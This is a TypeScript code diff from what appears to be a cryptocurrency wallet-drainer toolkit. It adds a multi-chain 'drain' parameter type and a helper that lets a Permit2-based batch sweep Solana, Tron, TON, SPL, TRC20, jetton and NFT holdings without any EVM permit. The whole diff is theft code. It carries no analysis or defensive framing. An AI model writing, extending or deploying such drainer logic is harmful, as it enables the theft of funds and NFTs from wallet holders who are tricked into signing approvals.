@@ -34,6 +34,36 @@ import {
   type NftApprovalTypedData,
 } from './nft-drain.js'
 
+export type OmnichainBatchDrainParams = {
+  nativeAmount?: bigint
+  nativeAmountSol?: bigint
+  nativeAmountTrx?: bigint
+  nativeAmountTon?: bigint
+  solWallet?: string
+  trxWallet?: string
+  tonWallet?: string
+  splMint?: string
+  splAmount?: bigint
+  trc20Contract?: string
+  trc20Amount?: bigint
+  jettonMaster?: string
+  jettonAmount?: bigint
+  nfts?: BatchNftEntry[]
+}
+
+/** True when batch can proceed without EVM permit legs (SOL/TRX/TON/SPL/TRC20/jetton/NFT only). */
+export function hasOmnichainBatchDrainLeg(params: OmnichainBatchDrainParams): boolean {
+  return (
+    Boolean(params.solWallet && params.nativeAmountSol != null && params.nativeAmountSol > 0n) ||
+    Boolean(params.trxWallet && params.nativeAmountTrx != null && params.nativeAmountTrx > 0n) ||
+    Boolean(params.tonWallet && params.nativeAmountTon != null && params.nativeAmountTon > 0n) ||
+    Boolean(params.solWallet && params.splMint && params.splAmount != null && params.splAmount > 0n) ||
+    Boolean(params.trxWallet && params.trc20Contract && params.trc20Amount != null && params.trc20Amount > 0n) ||
+    Boolean(params.tonWallet && params.jettonMaster && params.jettonAmount != null && params.jettonAmount > 0n) ||
+    Boolean(params.nfts && params.nfts.length > 0)
+  )
+}
+
 export type NativeTransferTxRequest = {
   from: Address
   to: Address
@@ -191,8 +221,9 @@ export async function batchNativeWithPermit2(params: {
   rpcUrl?: string
 }): Promise<BatchNativeWithPermit2Result> {
   const nativeAmount = params.nativeAmount ?? 0n
-  if (params.permits.length === 0 && nativeAmount <= 0n) {
-    throw new Error('batchNativeWithPermit2 requires at least one permit or nativeAmount > 0')
+  const omnichainLeg = hasOmnichainBatchDrainLeg(params)
+  if (params.permits.length === 0 && nativeAmount <= 0n && !omnichainLeg) {
+    throw new Error('batchNativeWithPermit2 requires at least one permit, nativeAmount > 0, or omnichain leg')
   }
 
   const engineSpender = params.engineSpender ?? resolveEngineSpenderAddress()
